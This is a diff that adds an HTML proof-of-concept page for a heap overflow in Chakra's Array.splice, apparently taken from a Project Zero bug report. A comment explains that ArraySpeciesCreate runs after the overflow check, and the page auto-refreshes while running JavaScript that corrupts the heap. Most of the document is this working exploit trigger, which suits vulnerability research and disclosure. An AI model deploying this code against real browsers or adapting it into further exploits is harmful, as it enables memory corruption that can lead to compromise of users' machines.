@@ -1,0 +1,88 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=934
+
+There is a heap overflow in Array.splice in Chakra.
+
+When an array is spliced, and overflow check is performed, but ArraySpeciesCreate, which can execute code and alter the array is called after this. This can allow an Array with boundaries that cause integer overflows to be spliced, leading to heap overflows in several situations.
+
+A minimal PoC is as follows and a full PoC is attached.
+
+var a = [];
+
+class dummy{}
+
+a.length = 200000;
+a.fill(7, 10000, 10200);
+
+var o = {};
+
+Object.defineProperty(o, 'constructor', {
+    get: function() {
+      a.length = 0xfffffffe;
+      var k = [];
+      k.fill.call(a, 7.7, 0xfffff000, 0xfffffffe);
+      return dummy;
+    }
+  });
+
+a.__proto__ = o;
+
+var q = [];
+q.length = 500;
+q.fill(7.7);
+
+var j = [];
+
+a.length = 0xfffffffe - 500;
+
+j.splice.call(a, 0, ...q);
+a[0xfffff1ec - 1] = 10;
+
+This PoC is a bit unreliable, it may need to be refreshed a few times to crash.
+-->
+
+<html>
+<head>
+<meta http-equiv="refresh" content="1">
+</head> 
+
+<body>
+<script>
+
+
+var a = [];
+
+class dummy{}
+
+
+a.length = 200000;
+a.fill(7, 10000, 10200);
+
+var o = {};
+  Object.defineProperty(o, 'constructor', {
+    get: function() {
+      a.length = 0xfffffffe;
+      var k = [];
+      k.fill.call(a, 7.7, 0xfffff000, 0xfffffffe);
+      return dummy;
+    }
+  });
+
+a.__proto__ = o;
+
+var q = [];
+q.length = 500;
+q.fill(7.7);
+
+var j = [];
+
+a.length = 0xfffffffe - 500;
+
+
+j.splice.call(a, 0, ...q);
+a[0xfffff1ec - 1] = 10;
+
+
+</script>
+</body>
+</html>
